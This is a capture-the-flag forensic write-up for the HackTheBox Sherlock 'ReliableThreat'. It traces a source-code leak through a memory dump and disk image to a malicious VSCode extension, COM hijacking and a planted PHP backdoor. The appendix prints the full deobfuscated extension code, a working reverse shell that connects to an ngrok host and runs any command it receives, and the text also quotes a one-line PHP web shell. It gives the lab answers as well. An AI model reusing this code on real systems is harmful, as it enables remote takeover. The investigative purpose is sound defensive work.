# [HackTheBox Sherlocks - ReliableThreat](https://app.hackthebox.com/sherlocks/ReliableThreat)
Created: 21/02/2025 02:05
Last Updated: 05/03/2025 05:02
* * *
![d56b31f9f52f2b2b454bfe00a8e2da5b.png](/resources/d56b31f9f52f2b2b454bfe00a8e2da5b.png)

**Scenario:**
We have discovered a serious security breach involving the unauthorized exposure of our source code. An employee has been identified as a potential suspect in this incident. However, the employee strongly denies any involvement or downloading of external programs. We seek your expertise in digital forensic investigation to perform a comprehensive analysis, determine the root cause of the leak, and help us resolve the situation effectively.

* * *
![fbafe82b2358b182e25f2e0947534457.png](/resources/fbafe82b2358b182e25f2e0947534457.png)

This sherlock provides 2 files.

![befbe2fdede5e49618f6b4d8cc5d269a.png](/resources/befbe2fdede5e49618f6b4d8cc5d269a.png)

The first file is Windows memory dump and the second file is likely to be a disk image.

![315d1964fd153a7bf39b06e248c584f5.png](/resources/315d1964fd153a7bf39b06e248c584f5.png)

I opened the second file with FTK Imager which confirmed that this is a disk image file but only contains specific folders of Public and User2 user.

>Task 1: What is the application that starts the suspicious chain of processes?

First I used `vol3 -f memdump.dmp windows.pstree >> pstree.txt` to list all processes when this memory dump was taken and pipe into a text file which I could open it in Text Editor, Its better to use the latest version of Volatility 3 for this memory dump since its offers faster then Volatility 2 and also offers enough plugins to solve this sherlock. 

![bab33e1d7be713d9024e3549b36fa203.png](/resources/bab33e1d7be713d9024e3549b36fa203.png)

`windows.pstree` plugin for Volatility 3 combines result from command line too so we could see more than just regular pstree from Volatility 2. Now focused on the process tree, we could see suspicious `RuntimeBroker.exe` was executed from `C:\Users\Public` folder and its also a child process of `cmd.exe`

What make this interesting is `cmd.exe` has `Code.exe` as the parent process which mean Visual Studio Code is responsible for the execution of `RuntimeBroker.exe`

![abbf3b762e01d7024ed25e78dbc92ad8.png](/resources/abbf3b762e01d7024ed25e78dbc92ad8.png)

So we could check for network connection with `vol3 -f memdump.dmp windows.netstat` then we will see that `RuntimeBroker.exe` was connected to 18[.]197[.]239[.]5 on port 18854

![755e7c36685527eed1764b138cbbfaba.png](/resources/755e7c36685527eed1764b138cbbfaba.png)

This IP address is belonged to Amazon and was abused by NJ RAT according to Crowdsourced, by now we could concluded that the application that started the suspicious chain of processes is VSCode (`Code.exe`) and the full path of the suspicious executable being run during the infection chain (Task 8) is `C:\Users\Public\RuntimeBroker.exe`.

```
Code.exe
```

>Task 2: Provide the full path of the malicious file used to gain initial access.

![b2ec70b15197b979541cf1163c71f3cd.png](/resources/b2ec70b15197b979541cf1163c71f3cd.png)

I did some research on how VSCode could lead to reverse shell and malware execution which leaded me to several news about Malicious VSCode extension.

Applied with threat hunting mindset, Lets do more research about this, First thing I wanted to know after learning about malicious VSCode extension is "Where to find them?" 

![7c6b10d18ff2bb9ce74ce055e46c6446.png](/resources/7c6b10d18ff2bb9ce74ce055e46c6446.png)

After a quick google search, I identified the location of VScode extension first which stores in `%USERPROFILE%\.vscode\extensions` so in this case we only have 1 user which mean all VScode extensions were stored in `C:\Users\User2\.vscode\extensions`.

![70996cc99644a4f3492a612101db32ae.png](/resources/70996cc99644a4f3492a612101db32ae.png)

Next question I had is "What is the file type/extension of VSCode extension?", Which I went to VSCode's [Your First Extension](https://code.visualstudio.com/api/get-started/your-first-extension) guide which I could see that both typescript(.ts) and javascript(.js) are possible to write VSCode extension. 

![0edeecd67f34a1112e42ac4e5ebfa68d.png](/resources/0edeecd67f34a1112e42ac4e5ebfa68d.png)

Its time for the hunt, I used `vol3 -f memdump.dmp windows.filescan > file.txt` to list all files that still cached in the memory dump to a text file then used `grep '\.vscode\\extensions' file.txt | cut -d '\' -f 6 | sort | uniq` to filter for all VSCode extension name 

Which we can see that beside from the extension name, we also got the author name of each extension (the folder shows from filescan output is named with Unique Identifier of VSCode extension and its consist with author and extension name)

What caught my interest is the extension that has the same author of this sherlock.

![2b811019a15fa9fed9acc7606e9e69dd.png](/resources/2b811019a15fa9fed9acc7606e9e69dd.png)

So I narrowed down my filter to this extension only then we will see that extension script of this VSCode extension in js. 

![46c4b42cdeb6528996e1b93ae97c34b1.png](/resources/46c4b42cdeb6528996e1b93ae97c34b1.png)

I used `vol3 -f memdump.dmp windows.dumpfiles --virtaddr 0x850cd2e704f0 && ls | grep extension` to dump this file from memory dump, do not worry about an error since the file will still get dumped (the error probably related to null bytes on the last line of this file, you would see it when you opened the file with VSCode)

![572abbca6a724885f52ff7959c425465.png](/resources/572abbca6a724885f52ff7959c425465.png)

After reviewing the code, we can see that on the line 64 after user proceeded with "help" options (task 3) then it will execute obfuscated code on line 66

![c470b25b991386e6d05d413727d13e8e.png](/resources/c470b25b991386e6d05d413727d13e8e.png)

After deobfuscated the code with https://obf-io.deobfuscate.io/, then we can see that this code will create a lockfile (so it could only one instance running at the same time, just like mutex) and it also create connection to `6.tcp.eu.ngrok.io` on port 16587 (task 4) but its appear that this is not the same port as we found from `RuntimeBroker.exe` process so we might have to dump it analyze later.

```
C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
```

>Task 3: What user input, when executed, will run the malicious code?
```
help
```

>Task 4: What are the hostname and port used to establish a reverse shell?
```
6.tcp.eu.ngrok.io:16587
```

>Task 5: What is the display name of the developer who created this malicious file?

![a424a7c11d26289d51827fac633326df.png](/resources/a424a7c11d26289d51827fac633326df.png)

Most VSCode extensions are source from VS Code Marketplace which is Microsoft's official repository for extensions. so I searched for the name of this extension online which reveal the Marketplace page of this extension.

![a0c017d129b82c080b72b6a18fe88c42.png](/resources/a0c017d129b82c080b72b6a18fe88c42.png)

And we can also see that the author of this extension on [VS Code Market place](https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T) matches the name we found from filescan output and also matches the author of this sherlock.

```
0xS1rx58.D3V
```

>Task 6: What time was the malicious file released? (UTC).

![aff711c26cf015874b96c8a4dad1126f.png](/resources/aff711c26cf015874b96c8a4dad1126f.png)

We can get the release date of this extension from the VS Code Marketplace but be aware that this timestamp is based on your timezone so we need to convert to UTC before submitting the answer

```
2024-07-23 00:41:19
```

>Task 7: Provide the SID for the user who has been compromised.

![ce707a6bedc8fba2ac38109ab8841da5.png](/resources/ce707a6bedc8fba2ac38109ab8841da5.png)

I used `vol3 -f memdump.dmp windows.getsids | grep User2` to print SID owning each process that belonged to User2 user.

```
S-1-5-21-1998887770-13753423-1649717590-1001
```

>Task 8: Provide the full path of the suspicious executable being run during the infection chain.
```
C:\Users\Public\RuntimeBroker.exe
```

>Task 9: The threat actor has modified the Windows registry to include a new entry. This change ensures that whenever a legitimate component runs, it triggers the malicious process, allowing the threat actor to maintain control of the system. Specify the name of the legitimate component.

![deb3e2c8a6c380dadb394debf17a762b.png](/resources/deb3e2c8a6c380dadb394debf17a762b.png)

I tried to find `C:\Users\Public\RuntimeBroker.exe` on the disk image but there is only `temp.exe` on this directory so we could dump it as a file or file hash and search it on [VirusTotal](https://www.virustotal.com/gui/file/4495ad23c3ed5017be7a93d5dcd8dae2f89e4ed12ffa01e34ef523b046c3ad90/behavior).

![2be681a81f1e27258db4b8da38358cc0.png](/resources/2be681a81f1e27258db4b8da38358cc0.png)

Its appears that this file is a malware written by the 
author of this sherlock and look at the registry key then we can see that this malware will alter registry key of the COM component with CLSID {645FF040-5081-101B-9F08-00AA002F954E} to download file `temp.exe` from C2 and execute with with PowerShell every time this component runs.

![32ae40393b63a2d09687abff2b47a9fa.png](/resources/32ae40393b63a2d09687abff2b47a9fa.png)

If we look up for this [CLSID](https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt) then we will find that this CLSID belongs to Recycle Bin.

```
Recycle Bin
```

- You can read more about CLSID and COM from fellow Medium blog here : https://medium.com/stolabs/a-brief-introduction-about-clsid-and-a-bypass-found-c11be972a38b

>Task 10: Which MITRE technique corresponds to the previous action?

![ca05e764311d437deb60f1366fe59bbd.png](/resources/ca05e764311d437deb60f1366fe59bbd.png)

An action from previous task is [COM Hijacking technique](https://attack.mitre.org/techniques/T1546/015/).

```
T1546.015
```

>Task 11: The threat actor has identified the location for all projects and manipulated one of the project files. Could you provide details about the malicious code that was added by the threat actor?

![c782d4772b755df1e8b18d820e045b16.png](/resources/c782d4772b755df1e8b18d820e045b16.png)

Now lets dig into Users's folder which we can see that there are 5 projects on this user's desktop.

![b4d8480c53e953d78cb2a6573e3a99c0.png](/resources/b4d8480c53e953d78cb2a6573e3a99c0.png)

I exported `Project` folder from disk image (you can mount) then I used `grep -r --include="*.php" . | grep '\$' | grep '\='` to filter for any php file that has both `$` and `=` to match the answer format which we can see that there is suspicious command that matches the answer format from laravel project.

![d5b02004a51bba77502afadf41d4f9eb.png](/resources/d5b02004a51bba77502afadf41d4f9eb.png)

This line introduces code execution on the system that running this website so this might be another backdoor added by the attacker to still have a way to get back into this system.

```
$testc = $_GET['s1']; echo `$testc`;
```

And now we solved the lab
![ec2f96071bdf5d294aad8e2435ab3f31.png](/resources/ec2f96071bdf5d294aad8e2435ab3f31.png)
https://labs.hackthebox.com/achievement/sherlock/1438364/859
* * *
## Appendix & Beyond Solved
```js
# deobfuscated JS code from https://obf-io.deobfuscate.io/ after renaming

const fs = require('fs');
const net = require("net");
const path = require("path");
const os = require('os');
const { pid } = require("process");

// Define the path for the lock file
const lockFilePath = path.join(os.homedir(), '.' + pid + ".lock");

// Check if the lock file exists
if (!fs.existsSync(lockFilePath)) {
  fs.writeFile(lockFilePath, '', error => {
    if (error) {
      console.error(error);
    }
  });

  (function () {
    // Create a new socket connection
    const socket = new net.Socket();
    socket.connect(16587, "6.tcp.eu.ngrok.io");

    // Handle incoming data from the socket
    socket.on("data", data => {
      const command = data.toString();
      require("child_process").exec(command, (error, stdout, stderr) => {
        if (error) {
          socket.write(stderr);
        } else {
          socket.write(stdout);
        }
      });
    });

    // Handle socket close event
    socket.on("close", () => {
      console.log("Socket connection closed");
    });

    return /a/; // Keeps the function from being optimized away
  })();
}
```

![87119aab785e23d551c8350a54288a56.png](/resources/87119aab785e23d551c8350a54288a56.png)
We could also find task 9 answer by decompiled binary with Ghidra like this

![f92840a6dee375dfd50b7ee2f389bf69.png](/resources/f92840a6dee375dfd50b7ee2f389bf69.png)
Or better, we can strings it out

* * *